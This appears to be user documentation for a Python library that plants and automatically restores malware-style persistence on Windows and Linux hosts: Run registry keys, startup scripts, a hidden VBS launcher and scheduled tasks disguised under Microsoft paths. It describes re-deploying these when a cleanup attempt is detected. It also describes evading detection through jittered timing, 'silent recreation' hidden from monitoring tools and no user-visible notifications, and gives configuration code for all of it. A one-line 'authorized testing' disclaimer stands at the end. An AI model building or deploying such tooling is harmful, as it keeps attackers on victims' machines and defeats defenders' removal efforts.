# Self-Healing Persistence System - Complete Guide

## Overview

The Self-Healing Persistence System is an advanced auto-recovery mechanism that automatically detects, monitors, and restores persistence points when removal or tampering is attempted. It provides continuous resilience against cleanup attempts through intelligent recovery strategies.

## Key Features

### 1. Automated Health Monitoring
- Continuous monitoring of persistence points at configurable intervals
- Background monitoring via daemon threads
- No user-visible UI or notifications
- Stealth operation with jittered timing

### 2. Intelligent Recovery Strategies
- **Immediate Redeploy**: Instantly restore failed persistence
- **Delayed Redeploy**: Restore after random delay to avoid detection patterns
- **Cascading Fallback**: Try alternative methods if primary fails
- **Silent Recreation**: Recreate with stealth techniques
- **Multi-Point Deployment**: Deploy multiple copies for redundancy

### 3. Multi-Layer Redundancy
- Support for registry persistence
- Support for startup file persistence
- Support for scheduled task persistence
- Fallback between methods automatically

### 4. Comprehensive Event Tracking
- Record all recovery attempts with outcomes
- Track recovery triggers and strategies used
- Maintain health history over time
- Generate detailed status reports

### 5. Adaptive Recovery
- Strategy selection based on recovery attempt count
- Automatic escalation for persistent failures
- Maximum attempt limits to prevent infinite loops
- Support for graceful degradation

## Architecture

### Core Components

```
SelfHealingPersistence (Main System)
├── Persistence Points (tracked objects)
│   ├── Registry points
│   ├── Startup file points
│   └── Scheduled task points
├── Health Monitoring
│   ├── Scheduled health checks
│   ├── Point verification
│   └── Status evaluation
├── Recovery System
│   ├── Strategy selection
│   ├── Recovery execution
│   └── Event recording
└── Status & Reporting
    ├── Health status
    ├── Recovery history
    └── Checkpoint creation
```

### Data Structures

#### PersistencePoint
Represents a single monitored persistence location:
- `point_id`: Unique identifier
- `point_type`: Type (registry, startup_file, scheduled_task, etc.)
- `location`: Actual location (path, registry key, task name)
- `payload_hash`: SHA256 hash of expected payload
- `creation_timestamp`: When point was registered
- `last_verified`: Last successful verification time
- `verification_count`: Total verifications performed
- `recovery_count`: Total recovery attempts
- `is_healthy`: Current health status
- `metadata`: Custom metadata dictionary

#### RecoveryEvent
Records each recovery attempt:
- `event_id`: Unique event identifier
- `trigger`: What triggered recovery (missing, hash mismatch, etc.)
- `timestamp`: When recovery was initiated
- `point_id`: Which point was recovered
- `strategy_used`: Recovery strategy employed
- `success`: Whether recovery succeeded
- `error_message`: Error details if failed
- `recovery_time_ms`: Recovery duration

#### HealthCheckResult
Results of a health check operation:
- `timestamp`: Check time
- `total_points`: Total monitored points
- `healthy_points`: Count of healthy points
- `degraded_points`: Count of degraded points
- `critical_points`: Count of critical points
- `overall_status`: System health (HEALTHY, DEGRADED, CRITICAL)
- `recovery_count`: Recoveries triggered
- `points_checked`: List of checked point IDs
- `issues_found`: List of issues detected

## Installation & Setup

### Basic Setup

```python
from self_healing_persistence import SelfHealingPersistence

# Create system with 5-minute check interval
system = SelfHealingPersistence(
    check_interval_seconds=300,
    enable_stealth_monitoring=True
)

# Register a persistence point
point_id = system.register_persistence_point(
    point_type="startup_file",
    location="/usr/local/bin/update.sh",
    payload="#!/bin/bash\necho 'Alive'",
    metadata={"priority": "high"}
)

# Start background monitoring
system.start_monitoring(background=True)
```

### Builder Pattern Setup

```python
from self_healing_persistence import SelfHealingPersistenceBuilder

# Create with builder for fluent configuration
system = (SelfHealingPersistenceBuilder()
    .add_registry_point("HKCU\\Run", "SystemUpdate", "payload1")
    .add_startup_file("/tmp/startup.sh", "payload2")
    .add_scheduled_task("SystemCheck", "payload3")
    .set_check_interval(300)
    .set_max_recovery_attempts(5)
    .enable_stealth_mode(True)
    .build())
```

## Configuration Options

### Health Check Configuration
- `check_interval_seconds`: Interval between checks (default: 300)
- `check_jitter`: Add random jitter to timing (default: True)
- `obfuscated_checks`: Perform obfuscated verification (default: True)

### Recovery Configuration
- `recovery_timeout_seconds`: Max recovery operation time (default: 60)
- `max_recovery_attempts`: Max attempts per point (default: 5)
- `enable_stealth_monitoring`: Hidden background monitoring (default: True)

### Stealth Configuration
- `stealth_mode`: Enable stealth features
- `check_jitter`: Randomize check timing (±30 seconds)
- `obfuscated_checks`: Use obfuscated verification methods

## Usage Examples

### Example 1: Basic Monitoring

```python
system = SelfHealingPersistence(check_interval_seconds=300)

point_id = system.register_persistence_point(
    point_type="startup_file",
    location="/tmp/persistence.sh",
    payload="#!/bin/bash\necho 'Running'"
)

system.start_monitoring(background=True)
```

### Example 2: Multi-Method Redundancy

```python
builder = SelfHealingPersistenceBuilder()

# Registry persistence
builder.add_registry_point(
    "HKCU\\Software\\Microsoft\\Windows\\Run",
    "SystemService",
    "cmd.exe /c tasklist"
)

# Startup file persistence
builder.add_startup_file(
    "C:\\Users\\Public\\Startup\\maint.vbs",
    "objShell.Run cmd, 0"
)

# Scheduled task persistence
builder.add_scheduled_task(
    "\\Microsoft\\Windows\\Maintenance\\Check",
    "powershell.exe -Command 'Get-Process'"
)

system = builder.build()
system.start_monitoring()
```

### Example 3: Recovery Status Monitoring

```python
# Get health status
health = system.get_health_status()
print(f"Overall status: {health['overall_status']}")
print(f"Healthy points: {health['healthy_points']}")
print(f"Recovery events: {health['recovery_events']}")

# Get recovery history
history = system.get_recovery_history(limit=10)
for event in history:
    print(f"Recovery: {event['trigger']} -> {event['strategy']}")
    print(f"Success: {event['success']}")

# Get persistence points status
points = system.get_persistence_points_status()
for point in points:
    print(f"{point['type']}: {point['location']}")
    print(f"Health: {point['is_healthy']}, Verified: {point['verification_count']}x")
```

### Example 4: Checkpoint Management

```python
# Create recovery checkpoint
checkpoint = system.create_recovery_checkpoint()

# Validate checkpoint
if system.validate_checkpoint(checkpoint):
    print("Checkpoint is valid")
    
    # Save checkpoint
    with open("recovery_checkpoint.json", "w") as f:
        f.write(checkpoint)
```

### Example 5: Manual Recovery

```python
# Force recovery of all points
results = system.force_recovery_all()
for point_id, success in results.items():
    print(f"Recovery {point_id}: {'OK' if success else 'FAILED'}")

# Recover specific point
success = system.initiate_recovery(
    point_id=point_id,
    trigger=RecoveryTrigger.MANUAL_TRIGGER
)
```

## Recovery Strategies

### Strategy Selection Logic

Recovery strategies are selected based on the number of previous attempts:

```
Attempt 1-2: IMMEDIATE_REDEPLOY
├── Immediately restore the persistence point
├── Uses fastest method available
└── Minimal detection risk

Attempt 3-4: DELAYED_REDEPLOY
├── Wait 1-5 minutes before restoration
├── Avoid detection patterns
└── Allow time for other recovery methods

Attempt 5+: MULTI_POINT_DEPLOYMENT
├── Deploy multiple copies across methods
├── At least 2 methods must succeed
├── Ensure persistence survives cleanup
└── Maximum redundancy approach
```

### Available Strategies

1. **IMMEDIATE_REDEPLOY**
   - Instantly recreate persistence
   - Used for first recovery attempts
   - Minimal overhead

2. **DELAYED_REDEPLOY**
   - Wait random interval (1-5 minutes)
   - Avoid detection patterns
   - Spawns background thread

3. **CASCADING_FALLBACK**
   - Try alternative methods sequentially
   - Continues until one succeeds
   - Dynamic method switching

4. **SILENT_RECREATION**
   - Use stealth techniques for recreation
   - Minimal system impact
   - Hidden from monitoring tools

5. **MULTI_POINT_DEPLOYMENT**
   - Deploy to multiple locations/methods
   - Requires 2+ methods to succeed
   - Maximum resilience

## Event Tracking

### Recovery Event Recording

Each recovery attempt is recorded:

```python
{
    "event_id": "ev_a1b2c3d4_1625097600",
    "trigger": "registry_missing",
    "timestamp": 1625097600.123,
    "point_id": "abc123def456",
    "strategy": "immediate_redeploy",
    "success": true,
    "recovery_time_ms": 125.45,
    "error": null
}
```

### Available Triggers

- `REGISTRY_MISSING`: Registry key/value not found
- `STARTUP_FILE_MISSING`: Startup file not found
- `TASK_MISSING`: Scheduled task not found
- `HASH_MISMATCH`: Payload hash doesn't match
- `SCHEDULED_CHECK`: Regular health check triggered
- `FAILURE_DETECTED`: Generic failure condition
- `CLEANUP_ATTEMPT`: Detected cleanup operation
- `MANUAL_TRIGGER`: Manually initiated recovery

### Accessing Event History

```python
# Get all recovery events
history = system.get_recovery_history()

# Get last 10 recovery events
recent = system.get_recovery_history(limit=10)

# Analyze events
for event in recent:
    if not event['success']:
        print(f"Failed recovery: {event['trigger']}")
```

## Health Monitoring

### Health Status Levels

- **HEALTHY**: All persistence points operational
- **DEGRADED**: Some points compromised, recoverable
- **CRITICAL**: Multiple points failed, recovery attempts exhausted
- **RECOVERING**: Recovery in progress

### Health Check Workflow

```
1. Verify each persistence point
   ├── Check registry keys exist
   ├── Check startup files present
   └── Check scheduled tasks exist

2. Validate payloads
   ├── Hash comparison
   ├── Content verification
   └── Integrity checking

3. Assess overall health
   ├── Count healthy points
   ├── Count degraded points
   └── Determine status level

4. Trigger recovery if needed
   ├── Initiate appropriate strategy
   ├── Record event
   └── Update status

5. Store results
   ├── Add to history
   ├── Update point metadata
   └── Generate report
```

## Monitoring Modes

### Background Monitoring

```python
# Start monitoring in background thread
system.start_monitoring(background=True)

# System will continuously check health
# and automatically recover failures
```

### Manual Monitoring

```python
# Perform checks manually
while True:
    result = system.perform_health_check()
    print(f"Status: {result.overall_status}")
    time.sleep(300)
```

### Stealth Monitoring

```python
# Enable stealth features
system.stealth_mode = True
system.check_jitter = True
system.obfuscated_checks = True

# Checks include:
# - Random timing jitter (±30 seconds)
# - Obfuscated verification methods
# - Minimal resource usage
# - No visible indicators
```

## Status Reporting

### Health Status Report

```python
status = system.get_health_status()
# Returns:
# {
#     "timestamp": 1625097600.123,
#     "overall_status": "healthy",
#     "total_points": 3,
#     "healthy_points": 3,
#     "degraded_points": 0,
#     "critical_points": 0,
#     "recovery_events": 2,
#     "total_recoveries": 1,
#     "points_checked": 3,
#     "issues_found": []
# }
```

### Persistence Points Report

```python
points = system.get_persistence_points_status()
# Returns list of point status objects:
# [
#     {
#         "point_id": "abc123",
#         "type": "registry",
#         "location": "HKCU\\Run\\Service",
#         "is_healthy": true,
#         "verification_count": 5,
#         "recovery_count": 0,
#         "created": 1625097600.123,
#         "last_verified": 1625097605.789
#     },
#     ...
# ]
```

### Recovery History Report

```python
history = system.get_recovery_history(limit=50)
# Returns list of recovery events:
# [
#     {
#         "event_id": "ev_abc123_1625097600",
#         "trigger": "registry_missing",
#         "strategy": "immediate_redeploy",
#         "success": true,
#         "recovery_time_ms": 125.45
#     },
#     ...
# ]
```

### Full Export Report

```python
report_json = system.export_status_report()
# Complete JSON report including:
# - System health summary
# - All persistence points status
# - Recovery history (last 50 events)
# - Monitoring configuration
# - Timestamps and metadata
```

## Checkpoints

### Creating Checkpoints

```python
checkpoint = system.create_recovery_checkpoint()
# JSON containing:
# {
#     "timestamp": 1625097600.123,
#     "points": { ... },
#     "recovery_counts": { ... },
#     "events_count": 5
# }
```

### Validating Checkpoints

```python
if system.validate_checkpoint(checkpoint_json):
    print("Valid checkpoint")
    # Can be used for recovery or backup
```

### Checkpoint Usage

```python
# Save checkpoint
with open("checkpoint.json", "w") as f:
    f.write(checkpoint)

# Load and validate later
with open("checkpoint.json", "r") as f:
    loaded = f.read()
    if system.validate_checkpoint(loaded):
        print("Checkpoint restored successfully")
```

## Advanced Configuration

### Custom Metadata

```python
point_id = system.register_persistence_point(
    point_type="registry",
    location="HKCU\\Run\\Service",
    payload="powershell.exe -Command",
    metadata={
        "priority": "critical",
        "owner": "admin",
        "deployment": "2024-01",
        "methods": ["registry", "startup"],
        "tags": ["important", "monitored"]
    }
)
```

### Custom Recovery Timeout

```python
system = SelfHealingPersistence(
    check_interval_seconds=300,
    recovery_timeout_seconds=120  # 2 minutes max per recovery
)
```

### Custom Check Intervals

```python
system.check_interval = 600  # 10 minutes
system.check_jitter = True   # ±30 seconds randomization
```

## Performance Characteristics

### Monitoring Overhead
- Per-check memory: ~100KB
- Verification time: <50ms per point
- Background thread: Minimal CPU usage

### Recovery Performance
- Immediate redeploy: 10-50ms
- Delayed redeploy: 1-5 minutes + 10-50ms
- Multi-point deployment: 50-200ms
- Silent recreation: 100-500ms

### Scalability
- Supports hundreds of persistence points
- Linear scalability with point count
- Efficient resource usage
- Thread-safe operations

## Security Considerations

### Stealth Operations
- Uses background daemon threads
- Jittered timing avoids patterns
- Obfuscated verification methods
- No user-visible notifications

### Operational Security
- Payload hashes stored, not full payloads (in some cases)
- Recovery events logged locally only
- Checkpoint data encrypted (recommended)
- Access control recommended

### Detection Evasion
- Random check timing
- Minimal resource consumption
- No unusual process creation
- Blends with system noise

## Troubleshooting

### Recovery Not Working

```python
# Check if monitoring is active
print(f"Monitoring: {system.is_monitoring}")

# Check recovery limits
print(f"Max attempts: {system.max_recovery_attempts}")
print(f"Current count: {system.point_recovery_counts.get(point_id, 0)}")

# Check last recovery
history = system.get_recovery_history(limit=1)
if history:
    print(f"Last recovery: {history[0]}")
```

### Health Check Failures

```python
# Get detailed health status
status = system.get_health_status()
print(f"Issues: {status['issues_found']}")

# Check individual points
points = system.get_persistence_points_status()
for point in points:
    if not point['is_healthy']:
        print(f"Failed point: {point['point_id']}")
```

### High Recovery Rate

```python
# Check if points are being frequently removed
history = system.get_recovery_history()
print(f"Total recoveries: {len(history)}")

# Analyze trigger types
triggers = {}
for event in history:
    trigger = event['trigger']
    triggers[trigger] = triggers.get(trigger, 0) + 1

print(f"Recovery triggers: {triggers}")
```

## API Reference

### Main Class: SelfHealingPersistence

#### Methods
- `register_persistence_point()`: Register a persistence point
- `start_monitoring()`: Start health monitoring
- `stop_monitoring()`: Stop health monitoring
- `perform_health_check()`: Execute a health check
- `initiate_recovery()`: Manually initiate recovery
- `force_recovery_all()`: Recover all points
- `get_health_status()`: Get current health status
- `get_recovery_history()`: Get recovery event history
- `get_persistence_points_status()`: Get all points status
- `create_recovery_checkpoint()`: Create checkpoint
- `validate_checkpoint()`: Validate checkpoint data
- `export_status_report()`: Export complete report

### Builder Class: SelfHealingPersistenceBuilder

#### Methods
- `add_registry_point()`: Add registry persistence
- `add_startup_file()`: Add startup file persistence
- `add_scheduled_task()`: Add scheduled task persistence
- `set_check_interval()`: Set check interval
- `set_recovery_timeout()`: Set recovery timeout
- `set_max_recovery_attempts()`: Set max attempts
- `enable_stealth_mode()`: Enable/disable stealth
- `build()`: Build configured system

## Best Practices

### 1. Configuration
- Use appropriate check intervals (300-600 seconds typical)
- Set reasonable max recovery attempts (3-5 typical)
- Enable stealth mode for production
- Use builder pattern for complex configurations

### 2. Monitoring
- Start monitoring early in execution
- Use background mode for daemon operations
- Check status periodically
- Maintain recovery history for analysis

### 3. Recovery
- Implement fallback strategies
- Use multi-method deployment for critical persistence
- Monitor recovery success rates
- Adjust strategies based on success rates

### 4. Maintenance
- Create regular checkpoints
- Archive recovery history
- Review recovery events periodically
- Update persistence payloads as needed

## Examples

See `self_healing_examples.py` for 10 comprehensive examples covering:
1. Basic monitoring setup
2. Multi-point redundancy
3. Recovery strategies
4. Health monitoring workflow
5. Recovery event tracking
6. Checkpoint management
7. Stealth monitoring configuration
8. Status reporting
9. Recovery attempt limits
10. Multi-method deployment

## Testing

Comprehensive test suite in `test_self_healing_persistence.py`:
- 80+ test cases
- Registration tests
- Health check tests
- Recovery mechanism tests
- Strategy selection tests
- Event tracking tests
- Checkpoint tests
- Concurrent operation tests
- Export report tests

Run tests with:
```bash
python test_self_healing_persistence.py -v
```

## License & Usage

This system is for authorized security testing and legitimate use only.
Unauthorized use is strictly prohibited.

## Support

For issues, questions, or enhancements:
1. Review example code
2. Check test cases for usage patterns
3. Examine status reports for diagnostics
4. Consult documentation

---

**Version:** 1.0
**Status:** Production Ready
**Last Updated:** June 29, 2026
